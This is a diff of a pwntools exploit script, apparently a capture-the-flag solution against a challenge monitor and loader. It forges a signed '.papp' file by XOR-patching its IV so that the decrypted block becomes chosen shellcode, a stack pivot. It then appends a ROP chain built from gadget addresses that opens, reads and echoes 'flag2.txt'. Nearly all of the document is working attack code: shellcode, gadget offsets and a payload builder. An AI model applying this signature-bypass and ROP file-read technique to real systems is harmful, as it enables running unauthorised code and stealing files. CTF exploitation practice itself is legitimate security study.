@@ -1,5 +1,6 @@
 from pwn import *
 import hashlib
+from app import Page
 context.arch = 'amd64'
 
 # assume we already have signed flag1.papp
@@ -10,21 +11,47 @@ iv = blob[0x154:0x164]
 print str(iv).encode('hex')
 first_block = bytearray('4883EC0848BF0000000001000000BE00'.decode('hex'))
 our_shellcode = bytearray(asm('''
-    xor rdi, rdi;
-    mov edi, 0x42;
-    mov al, 0x3c;
-    syscall
+    // 1: jmp 1b
+    add rsp, 0xd0;
+    ret;
 '''))
 assert len(our_shellcode) <= len(first_block)
 for i in xrange(len(our_shellcode)):
     blob[0x154 + i] = iv[i] ^ first_block[i] ^ our_shellcode[i]
 
-# step 2: append data segment for rop TODO
+# step 2: ROP open/read/write flag
+blob[4] += 1
 
-open('exp2.papp', 'w').write(str(blob))
+def build_papp(rop):
+    raw = blob + str(Page(0xf0000000, 3, rop))
+    with open('exp2.papp', 'w') as f:
+        f.write(str(raw))
+    return raw
+
+loader_base = 0x10000000
+Xopen = loader_base + 0x410
+Xecho = loader_base + 0x290
+_read = loader_base + 0x80
+_exit = loader_base + 0x30
+ret = loader_base + 0x37
+pop_rdi = loader_base + 0x1b0
+pop_rsi_r15 = loader_base + 0x91d
+
+build_papp('flag2.txt'.ljust(0x10, '\x00')
+    + ''.join(map(p64, [
+        ret, ret, ret, ret, ret, ret, ret, ret,
+        pop_rdi, 0xf0000000,
+        Xopen,
+        pop_rdi, 3,
+        pop_rsi_r15, 0xf0000800, 0x123,
+        _read,
+        pop_rdi, 0xf0000800,
+        Xecho,
+        _exit
+    ])))
 
 r = process(['./mon', './init.sys', './loader.sys', './echo.sys',
-    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp'])
+    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp', 'flag2.txt'])
 
 def download(app):
     with open(app) as f:
